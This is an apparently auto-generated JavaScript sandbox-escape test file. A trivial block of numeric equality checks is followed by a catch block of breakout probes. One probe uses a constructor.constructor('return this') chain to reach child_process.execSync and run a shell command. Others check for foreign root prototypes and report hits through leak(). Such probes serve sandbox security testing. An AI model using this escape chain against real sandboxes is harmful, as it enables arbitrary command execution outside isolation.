try {
    if (0 !== 0) {
        $ERROR('#0: 0.00 === 0');
    }
    if (1 !== 1) {
        $ERROR('#1: 1.00 === 1');
    }
    if (2 !== 2) {
        $ERROR('#2: 2.00 === 2');
    }
    if (3 !== 3) {
        $ERROR('#3: 3.00 === 3');
    }
    if (4 !== 4) {
        $ERROR('#4: 4.00 === 4');
    }
    if (5 !== 5) {
        $ERROR('#5: 5.00 === 5');
    }
    if (6 !== 6) {
        $ERROR('#6: 6.00 === 6');
    }
    if (7 !== 7) {
        $ERROR('#7: 7.00 === 7');
    }
    if (8 !== 8) {
        $ERROR('#8: 8.00 === 8');
    }
    if (9 !== 9) {
        $ERROR('#9: 9.00 === 9');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}